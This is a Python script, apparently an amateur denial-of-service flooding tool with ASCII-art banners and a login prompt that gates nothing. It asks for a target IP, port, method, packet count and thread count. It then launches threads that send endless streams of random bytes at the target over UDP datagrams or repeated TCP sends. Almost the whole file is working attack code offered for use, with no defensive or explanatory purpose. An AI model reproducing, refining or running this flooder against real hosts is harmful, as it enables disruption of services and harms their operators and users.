import random
import socket
import threading
import time
import os,sys

os.system('clear')
print("\033[1;31;40m")
os.system("clear")
print("""\033[93m
\033[93m
 █████                          ███
░░███                          ░░░
 ░███         ██████   ███████ ████  ████████
 ░███        ███░░███ ███░░███░░███ ░░███░░███
 ░███       ░███ ░███░███ ░███ ░███  ░███ ░███
 ░███      █░███ ░███░███ ░███ ░███  ░███ ░███
 ███████████░░██████ ░░███████ █████ ████ █████
░░░░░░░░░░░  ░░░░░░   ░░░░░███░░░░░ ░░░░ ░░░░░
                      ███ ░███
                     ░░██████
                      ░░░░░░
             \033[93m>> \033[96m Fuck Da CLown \033[93m<<
            \033[97m
   ███
  █   █
\033[97m  █   █                      
\033[97m█████████               ██   
\033[97m█████████              █  █  
\033[97m███   ███ ██████████████  █
\033[97m████ ████ █ █          █  █
\033[97m█████████               ██     \033[33m
""")
username = str(input("\033[33m[Lexa Da CLown] \033[93mUsername:"))
password = str(input("\033[33m[Cryspot The Shadow God] \033[93mPassword:"))
if password == "lexa" and username == "RedX":
    print ("Logged in as Clown")
    time.sleep(2)

os.system("clear")
print("\033[92mConnecting To Server [\033[97m•\033[92m]")
time.sleep(0.9)

os.system("clear")
print("Connecting To Server [\033[97m••\033[92m]")
time.sleep(0.9)

os.system("clear")
print("Connecting To Server [\033[97m•••\033[92m]")
time.sleep(0.9)

os.system("clear")
print("Connecting To Server [\033[97m••\033[92m]")
time.sleep(0.9)

os.system("clear")
print("Connecting To Server [\033[97m•\033[92m]")
time.sleep(0.9)

os.system("clear")
print("""
██████╗░███████╗██████ ╗██╗░░██╗
██╔══██╗██╔════╝██╔══██╗╚██╗██╔╝
██████╔╝█████╗░░██║░░██║░╚███╔╝
██╔══██╗██╔══╝░░██║░░██║░██╔██╗
██║░░██║███████╗██████╔╝██╔╝╚██╗
╚═╝░░╚═╝╚══════╝╚═════╝╚═╝░░╚═╝
""")
print("""\033[1;36;40m
___________________________________________
[•] METHODS UDP / TCP TOOLS
___________________________________________
""")

ip = str(input("\033[1;36;40m[+] IP : \033[1;31;40m"))
port = int(input("\033[1;36;40m[+] PORT : \033[1;31;40m"))
choice = str(input("\033[1;36;40m[+] METHODS : \033[1;31;40m"))
times = int(input("\033[1;36;40m[+] PACKETS : \033[1;31;40m"))
threads = int(input("\033[1;36;40m[+] THREADS : \033[1;31;40m"))

os.system("clear")
def run():

	data = random._urandom(1050)

	i = random.choice(("","",""))

	while True:

		try:

			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

			addr = (str(ip),int(port))

			for x in range(times):

				s.sendto(data,addr)

			print("\033[1;36;40mSlayerEx Attack %s Port %s"%(ip,port))

		except:

			print("Down!!!")



def run2():

	data = random._urandom(102498)

	i = random.choice(("","",""))

	while True:

		try:

			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

			s.connect((ip,port))

			s.send(data)

			for x in range(times):

				s.send(data)

			print("\033[1;36;40mSlayerEx Attack %s Port %s"%(ip,port))

		except:

			s.close()

			print("Down!!")

for y in range(threads):
    if choice == 'UDP':
        th = threading.Thread(target = run)
        th.start()
    elif choice == 'TCP':
        th = threading.Thread(target = run2)
        th.start()
